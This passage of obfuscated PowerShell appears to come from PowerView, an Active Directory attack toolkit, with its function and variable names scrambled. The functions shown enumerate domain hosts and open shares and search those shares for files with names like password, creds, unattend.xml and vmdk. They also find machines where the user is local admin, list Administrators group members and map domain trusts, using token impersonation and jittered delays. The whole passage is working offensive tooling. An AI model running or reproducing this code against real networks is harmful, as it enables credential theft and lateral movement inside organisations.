                        $HBOFnZpM99 = $Share.Name
                        $Path = '\\'+$sKWGHAjO99+'\'+$HBOFnZpM99
                        if (($HBOFnZpM99) -and ($HBOFnZpM99.trim() -ne '')) {
                            if ($QUPXZQIY99) {
                                try {
                                    $Null = [IO.Directory]::GetFiles($Path)
                                    $Share
                                }
                                catch {
                                    Write-Verbose "Error accessing share path $Path : $_"
                                }
                            }
                            else {
                                $Share
                            }
                        }
                    }
                }
            }
            if ($TtWrEMPZ99) {
                lithe
            }
        }
        $nGIhjdzZ99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $nGIhjdzZ99 = departs -fxunRYJT99 $fxunRYJT99
            }
            else {
                $nGIhjdzZ99 = departs -fxunRYJT99 $fxunRYJT99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[exiles] Total number of hosts: $($LhPthbPt99.count)"
            Write-Verbose "[exiles] Delay: $Delay, Jitter: $WfsvHBIT99"
            $mOnaorlA99 = 0
            $zQKolgzb99 = New-Object System.Random
            ForEach ($sKWGHAjO99 in $LhPthbPt99) {
                $mOnaorlA99 = $mOnaorlA99 + 1
                Start-Sleep -Seconds $zQKolgzb99.Next((1-$WfsvHBIT99)*$Delay, (1+$WfsvHBIT99)*$Delay)
                Write-Verbose "[exiles] Enumerating server $sKWGHAjO99 ($mOnaorlA99 of $($LhPthbPt99.count))"
                Invoke-Command -qufpOQjV99 $xMDBlffj99 -ArgumentList $sKWGHAjO99, $QUPXZQIY99, $nGIhjdzZ99
            }
        }
        else {
            Write-Verbose "[exiles] Using threading with threads: $OVPWEKQH99"
            $fjioLOdg99 = @{
                'CheckShareAccess' = $QUPXZQIY99
                'TokenHandle' = $nGIhjdzZ99
            }
            liable -FRrsCtDf99 $LhPthbPt99 -qufpOQjV99 $xMDBlffj99 -KaKNBSkt99 $fjioLOdg99 -OVPWEKQH99 $OVPWEKQH99
        }
    }
    END {
        if ($nGIhjdzZ99) {
            lithe -TtWrEMPZ99 $nGIhjdzZ99
        }
    }
}
function forwarder {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $FRrsCtDf99,
        [ValidateNotNullOrEmpty()]
        [String]
        $dZsWzroh99,
        [ValidateNotNullOrEmpty()]
        [String]
        $aXAjpBZF99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ylCWjnDC99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $hmaWUxwb99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $dxKxxCOP99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $gnqgCtNx99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $locydHbE99 = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),
        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias('Share')]
        [String[]]
        $eDCHOFNG99,
        [String[]]
        $ExLniwri99 = @('C$', 'Admin$', 'Print$', 'IPC$'),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $cZehrTYi99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $RXjqZVXz99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $jZwVGUVo99,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $LRmLsTwY99,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $FWOqsNsz99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $WfsvHBIT99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $OVPWEKQH99 = 20
    )
    BEGIN {
        $AiVkGjhl99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $AiVkGjhl99['Domain'] = $dZsWzroh99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $AiVkGjhl99['LDAPFilter'] = $aXAjpBZF99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $AiVkGjhl99['SearchBase'] = $ylCWjnDC99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $AiVkGjhl99['OperatingSystem'] = $fvZEnbGC99 }
        if ($PSBoundParameters['ComputerServicePack']) { $AiVkGjhl99['ServicePack'] = $fGspowYC99 }
        if ($PSBoundParameters['ComputerSiteName']) { $AiVkGjhl99['SiteName'] = $DgPmuXLw99 }
        if ($PSBoundParameters['Server']) { $AiVkGjhl99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $AiVkGjhl99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $AiVkGjhl99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $AiVkGjhl99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $AiVkGjhl99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $AiVkGjhl99['Credential'] = $fxunRYJT99 }
        if ($PSBoundParameters['ComputerName']) {
            $LhPthbPt99 = $FRrsCtDf99
        }
        else {
            Write-Verbose '[forwarder] Querying computers in the domain'
            $LhPthbPt99 = sensationalist @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[forwarder] TargetComputers length: $($LhPthbPt99.Length)"
        if ($LhPthbPt99.Length -eq 0) {
            throw '[forwarder] No hosts found to enumerate'
        }
        $xMDBlffj99 = {
            Param($FRrsCtDf99, $locydHbE99, $ExLniwri99, $LRmLsTwY99, $XgZvFNWC99, $FWOqsNsz99, $QbPKbnJq99, $TtWrEMPZ99)
            if ($TtWrEMPZ99) {
                $Null = departs -TtWrEMPZ99 $TtWrEMPZ99 -Quiet
            }
            ForEach ($sKWGHAjO99 in $FRrsCtDf99) {
                $hNGAxzNJ99 = @()
                if ($sKWGHAjO99.StartsWith('\\')) {
                    $hNGAxzNJ99 += $sKWGHAjO99
                }
                else {
                    $Up = Test-Connection -Count 1 -Quiet -FRrsCtDf99 $sKWGHAjO99
                    if ($Up) {
                        $esdJYgCF99 = practise -FRrsCtDf99 $sKWGHAjO99
                        ForEach ($Share in $esdJYgCF99) {
                            $HBOFnZpM99 = $Share.Name
                            $Path = '\\'+$sKWGHAjO99+'\'+$HBOFnZpM99
                            if (($HBOFnZpM99) -and ($HBOFnZpM99.Trim() -ne '')) {
                                if ($ExLniwri99 -NotContains $HBOFnZpM99) {
                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        $hNGAxzNJ99 += $Path
                                    }
                                    catch {
                                        Write-Verbose "[!] No access to $Path"
                                    }
                                }
                            }
                        }
                    }
                }
                ForEach ($Share in $hNGAxzNJ99) {
                    Write-Verbose "Searching share: $Share"
                    $EBbIeAns99 = @{
                        'Path' = $Share
                        'Include' = $locydHbE99
                    }
                    if ($LRmLsTwY99) {
                        $EBbIeAns99['OfficeDocs'] = $LRmLsTwY99
                    }
                    if ($FWOqsNsz99) {
                        $EBbIeAns99['FreshEXEs'] = $FWOqsNsz99
                    }
                    if ($cZehrTYi99) {
                        $EBbIeAns99['LastAccessTime'] = $cZehrTYi99
                    }
                    if ($RXjqZVXz99) {
                        $EBbIeAns99['LastWriteTime'] = $RXjqZVXz99
                    }
                    if ($jZwVGUVo99) {
                        $EBbIeAns99['CreationTime'] = $jZwVGUVo99
                    }
                    if ($QbPKbnJq99) {
                        $EBbIeAns99['CheckWriteAccess'] = $QbPKbnJq99
                    }
                    heyday @SearchArgs
                }
            }
            if ($TtWrEMPZ99) {
                lithe
            }
        }
        $nGIhjdzZ99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $nGIhjdzZ99 = departs -fxunRYJT99 $fxunRYJT99
            }
            else {
                $nGIhjdzZ99 = departs -fxunRYJT99 $fxunRYJT99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[forwarder] Total number of hosts: $($LhPthbPt99.count)"
            Write-Verbose "[forwarder] Delay: $Delay, Jitter: $WfsvHBIT99"
            $mOnaorlA99 = 0
            $zQKolgzb99 = New-Object System.Random
            ForEach ($sKWGHAjO99 in $LhPthbPt99) {
                $mOnaorlA99 = $mOnaorlA99 + 1
                Start-Sleep -Seconds $zQKolgzb99.Next((1-$WfsvHBIT99)*$Delay, (1+$WfsvHBIT99)*$Delay)
                Write-Verbose "[forwarder] Enumerating server $sKWGHAjO99 ($mOnaorlA99 of $($LhPthbPt99.count))"
                Invoke-Command -qufpOQjV99 $xMDBlffj99 -ArgumentList $sKWGHAjO99, $locydHbE99, $ExLniwri99, $LRmLsTwY99, $XgZvFNWC99, $FWOqsNsz99, $QbPKbnJq99, $nGIhjdzZ99
            }
        }
        else {
            Write-Verbose "[forwarder] Using threading with threads: $OVPWEKQH99"
            $fjioLOdg99 = @{
                'Include' = $locydHbE99
                'ExcludedShares' = $ExLniwri99
                'OfficeDocs' = $LRmLsTwY99
                'ExcludeHidden' = $XgZvFNWC99
                'FreshEXEs' = $FWOqsNsz99
                'CheckWriteAccess' = $QbPKbnJq99
                'TokenHandle' = $nGIhjdzZ99
            }
            liable -FRrsCtDf99 $LhPthbPt99 -qufpOQjV99 $xMDBlffj99 -KaKNBSkt99 $fjioLOdg99 -OVPWEKQH99 $OVPWEKQH99
        }
    }
    END {
        if ($nGIhjdzZ99) {
            lithe -TtWrEMPZ99 $nGIhjdzZ99
        }
    }
}
function Kristina {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $FRrsCtDf99,
        [ValidateNotNullOrEmpty()]
        [String]
        $dZsWzroh99,
        [ValidateNotNullOrEmpty()]
        [String]
        $aXAjpBZF99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ylCWjnDC99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $hmaWUxwb99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $dxKxxCOP99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $gnqgCtNx99,
        [Switch]
        $QUPXZQIY99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $WfsvHBIT99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $OVPWEKQH99 = 20
    )
    BEGIN {
        $AiVkGjhl99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $AiVkGjhl99['Domain'] = $dZsWzroh99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $AiVkGjhl99['LDAPFilter'] = $aXAjpBZF99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $AiVkGjhl99['SearchBase'] = $ylCWjnDC99 }
        if ($PSBoundParameters['Unconstrained']) { $AiVkGjhl99['Unconstrained'] = $ynilECNu99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $AiVkGjhl99['OperatingSystem'] = $fvZEnbGC99 }
        if ($PSBoundParameters['ComputerServicePack']) { $AiVkGjhl99['ServicePack'] = $fGspowYC99 }
        if ($PSBoundParameters['ComputerSiteName']) { $AiVkGjhl99['SiteName'] = $DgPmuXLw99 }
        if ($PSBoundParameters['Server']) { $AiVkGjhl99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $AiVkGjhl99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $AiVkGjhl99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $AiVkGjhl99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $AiVkGjhl99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $AiVkGjhl99['Credential'] = $fxunRYJT99 }
        if ($PSBoundParameters['ComputerName']) {
            $LhPthbPt99 = $FRrsCtDf99
        }
        else {
            Write-Verbose '[Kristina] Querying computers in the domain'
            $LhPthbPt99 = sensationalist @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Kristina] TargetComputers length: $($LhPthbPt99.Length)"
        if ($LhPthbPt99.Length -eq 0) {
            throw '[Kristina] No hosts found to enumerate'
        }
        $xMDBlffj99 = {
            Param($FRrsCtDf99, $TtWrEMPZ99)
            if ($TtWrEMPZ99) {
                $Null = departs -TtWrEMPZ99 $TtWrEMPZ99 -Quiet
            }
            ForEach ($sKWGHAjO99 in $FRrsCtDf99) {
                $Up = Test-Connection -Count 1 -Quiet -FRrsCtDf99 $sKWGHAjO99
                if ($Up) {
                    $aVEYQxgo99 = patinas -FRrsCtDf99 $sKWGHAjO99
                    if ($aVEYQxgo99.IsAdmin) {
                        $sKWGHAjO99
                    }
                }
            }
            if ($TtWrEMPZ99) {
                lithe
            }
        }
        $nGIhjdzZ99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $nGIhjdzZ99 = departs -fxunRYJT99 $fxunRYJT99
            }
            else {
                $nGIhjdzZ99 = departs -fxunRYJT99 $fxunRYJT99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[Kristina] Total number of hosts: $($LhPthbPt99.count)"
            Write-Verbose "[Kristina] Delay: $Delay, Jitter: $WfsvHBIT99"
            $mOnaorlA99 = 0
            $zQKolgzb99 = New-Object System.Random
            ForEach ($sKWGHAjO99 in $LhPthbPt99) {
                $mOnaorlA99 = $mOnaorlA99 + 1
                Start-Sleep -Seconds $zQKolgzb99.Next((1-$WfsvHBIT99)*$Delay, (1+$WfsvHBIT99)*$Delay)
                Write-Verbose "[Kristina] Enumerating server $sKWGHAjO99 ($mOnaorlA99 of $($LhPthbPt99.count))"
                Invoke-Command -qufpOQjV99 $xMDBlffj99 -ArgumentList $sKWGHAjO99, $nGIhjdzZ99
            }
        }
        else {
            Write-Verbose "[Kristina] Using threading with threads: $OVPWEKQH99"
            $fjioLOdg99 = @{
                'TokenHandle' = $nGIhjdzZ99
            }
            liable -FRrsCtDf99 $LhPthbPt99 -qufpOQjV99 $xMDBlffj99 -KaKNBSkt99 $fjioLOdg99 -OVPWEKQH99 $OVPWEKQH99
        }
    }
}
function dry {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $FRrsCtDf99,
        [ValidateNotNullOrEmpty()]
        [String]
        $dZsWzroh99,
        [ValidateNotNullOrEmpty()]
        [String]
        $aXAjpBZF99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ylCWjnDC99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $hmaWUxwb99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $dxKxxCOP99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $gnqgCtNx99,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $YGzKEtMK99 = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $fQOJfqWf99 = 'API',
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $WfsvHBIT99 = .3,
        [Int]
        [ValidateRange(1, 100)]
        $OVPWEKQH99 = 20
    )
    BEGIN {
        $AiVkGjhl99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $AiVkGjhl99['Domain'] = $dZsWzroh99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $AiVkGjhl99['LDAPFilter'] = $aXAjpBZF99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $AiVkGjhl99['SearchBase'] = $ylCWjnDC99 }
        if ($PSBoundParameters['Unconstrained']) { $AiVkGjhl99['Unconstrained'] = $ynilECNu99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $AiVkGjhl99['OperatingSystem'] = $fvZEnbGC99 }
        if ($PSBoundParameters['ComputerServicePack']) { $AiVkGjhl99['ServicePack'] = $fGspowYC99 }
        if ($PSBoundParameters['ComputerSiteName']) { $AiVkGjhl99['SiteName'] = $DgPmuXLw99 }
        if ($PSBoundParameters['Server']) { $AiVkGjhl99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $AiVkGjhl99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $AiVkGjhl99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $AiVkGjhl99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $AiVkGjhl99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $AiVkGjhl99['Credential'] = $fxunRYJT99 }
        if ($PSBoundParameters['ComputerName']) {
            $LhPthbPt99 = $FRrsCtDf99
        }
        else {
            Write-Verbose '[dry] Querying computers in the domain'
            $LhPthbPt99 = sensationalist @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[dry] TargetComputers length: $($LhPthbPt99.Length)"
        if ($LhPthbPt99.Length -eq 0) {
            throw '[dry] No hosts found to enumerate'
        }
        $xMDBlffj99 = {
            Param($FRrsCtDf99, $YGzKEtMK99, $fQOJfqWf99, $TtWrEMPZ99)
            if ($YGzKEtMK99 -eq "Administrators") {
                $lWpQZZUw99 = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                $YGzKEtMK99 = ($lWpQZZUw99.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }
            if ($TtWrEMPZ99) {
                $Null = departs -TtWrEMPZ99 $TtWrEMPZ99 -Quiet
            }
            ForEach ($sKWGHAjO99 in $FRrsCtDf99) {
                $Up = Test-Connection -Count 1 -Quiet -FRrsCtDf99 $sKWGHAjO99
                if ($Up) {
                    $fnQUrQIJ99 = @{
                        'ComputerName' = $sKWGHAjO99
                        'Method' = $fQOJfqWf99
                        'GroupName' = $YGzKEtMK99
                    }
                    turpentine @NetLocalGroupMemberArguments
                }
            }
            if ($TtWrEMPZ99) {
                lithe
            }
        }
        $nGIhjdzZ99 = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $nGIhjdzZ99 = departs -fxunRYJT99 $fxunRYJT99
            }
            else {
                $nGIhjdzZ99 = departs -fxunRYJT99 $fxunRYJT99 -Quiet
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
            Write-Verbose "[dry] Total number of hosts: $($LhPthbPt99.count)"
            Write-Verbose "[dry] Delay: $Delay, Jitter: $WfsvHBIT99"
            $mOnaorlA99 = 0
            $zQKolgzb99 = New-Object System.Random
            ForEach ($sKWGHAjO99 in $LhPthbPt99) {
                $mOnaorlA99 = $mOnaorlA99 + 1
                Start-Sleep -Seconds $zQKolgzb99.Next((1-$WfsvHBIT99)*$Delay, (1+$WfsvHBIT99)*$Delay)
                Write-Verbose "[dry] Enumerating server $sKWGHAjO99 ($mOnaorlA99 of $($LhPthbPt99.count))"
                Invoke-Command -qufpOQjV99 $xMDBlffj99 -ArgumentList $sKWGHAjO99, $YGzKEtMK99, $fQOJfqWf99, $nGIhjdzZ99
            }
        }
        else {
            Write-Verbose "[dry] Using threading with threads: $OVPWEKQH99"
            $fjioLOdg99 = @{
                'GroupName' = $YGzKEtMK99
                'Method' = $fQOJfqWf99
                'TokenHandle' = $nGIhjdzZ99
            }
            liable -FRrsCtDf99 $LhPthbPt99 -qufpOQjV99 $xMDBlffj99 -KaKNBSkt99 $fjioLOdg99 -OVPWEKQH99 $OVPWEKQH99
        }
    }
    END {
        if ($nGIhjdzZ99) {
            lithe -TtWrEMPZ99 $nGIhjdzZ99
        }
    }
}
function adjustable {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $rtPnFfWd99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $mIpZvziV99,
        [Alias('ReturnOne')]
        [Switch]
        $HyjxYAeb99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $UYiDwLqP99 = @{
            [uint32]'0x00000001' = 'NON_TRANSITIVE'
            [uint32]'0x00000002' = 'UPLEVEL_ONLY'
            [uint32]'0x00000004' = 'FILTER_SIDS'
            [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
            [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
            [uint32]'0x00000020' = 'WITHIN_FOREST'
            [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
            [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
            [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
            [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
            [uint32]'0x00000400' = 'PIM_TRUST'
        }
        $sOuZbukB99 = @{}
        if ($PSBoundParameters['Domain']) { $sOuZbukB99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['LDAPFilter']) { $sOuZbukB99['LDAPFilter'] = $WmhkcxXr99 }
        if ($PSBoundParameters['Properties']) { $sOuZbukB99['Properties'] = $rtPnFfWd99 }
        if ($PSBoundParameters['SearchBase']) { $sOuZbukB99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $sOuZbukB99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sOuZbukB99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sOuZbukB99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sOuZbukB99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $sOuZbukB99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $sOuZbukB99['Credential'] = $fxunRYJT99 }
    }
    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne 'API') {
            $LwHIERlM99 = @{}
            if ($UtXBFQsM99 -and $UtXBFQsM99.Trim() -ne '') {
                $KiMKpLxi99 = $UtXBFQsM99
            }
            else {
                if ($PSBoundParameters['Credential']) {
                    $KiMKpLxi99 = (manège -fxunRYJT99 $fxunRYJT99).Name
                }
                else {
                    $KiMKpLxi99 = (manège).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne 'NET') {
            if ($UtXBFQsM99 -and $UtXBFQsM99.Trim() -ne '') {
                $KiMKpLxi99 = $UtXBFQsM99
            }
            else {
                $KiMKpLxi99 = $Env:USERDNSDOMAIN
            }
        }
        if ($PsCmdlet.ParameterSetName -eq 'LDAP') {
            $XmNnvrPC99 = bleachers @LdapSearcherArguments
            $PfGCLvFq99 = corrupter @NetSearcherArguments
            if ($XmNnvrPC99) {
                $XmNnvrPC99.Filter = '(objectClass=trustedDomain)'
                if ($PSBoundParameters['FindOne']) { $mKhNNgkp99 = $XmNnvrPC99.FindOne() }
                else { $mKhNNgkp99 = $XmNnvrPC99.FindAll() }
                $mKhNNgkp99 | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $RTUBxuup99 = New-Object PSObject
                    $xyvRSgGO99 = @()
                    $xyvRSgGO99 += $UYiDwLqP99.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $UYiDwLqP99[$_] }
                    $PdcjKkjK99 = Switch ($Props.trustdirection) {
                        0 { 'Disabled' }
                        1 { 'Inbound' }
                        2 { 'Outbound' }
                        3 { 'Bidirectional' }
                    }
                    $mkNkDyll99 = Switch ($Props.trusttype) {
                        1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                        2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                        3 { 'MIT' }
                    }
                    $ItxiPUio99 = $Props.distinguishedname[0]
                    $auvWWErk99 = $ItxiPUio99.IndexOf('DC=')
                    if ($auvWWErk99) {
                        $KiMKpLxi99 = $($ItxiPUio99.SubString($auvWWErk99)) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        $KiMKpLxi99 = ""
                    }
                    $HHLdbxGw99 = $ItxiPUio99.IndexOf(',CN=System')
                    if ($auvWWErk99) {
                        $QNLwMLiv99 = $ItxiPUio99.SubString(3, $HHLdbxGw99-3)
                    }
                    else {
                        $QNLwMLiv99 = ""
                    }
                    $VgpfHiUc99 = New-Object Guid @(,$Props.objectguid[0])
                    $vUyIbYgw99 = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value
                    $RTUBxuup99 | Add-Member Noteproperty 'SourceName' $KiMKpLxi99
                    $RTUBxuup99 | Add-Member Noteproperty 'TargetName' $Props.name[0]
                    $RTUBxuup99 | Add-Member Noteproperty 'TrustType' $mkNkDyll99
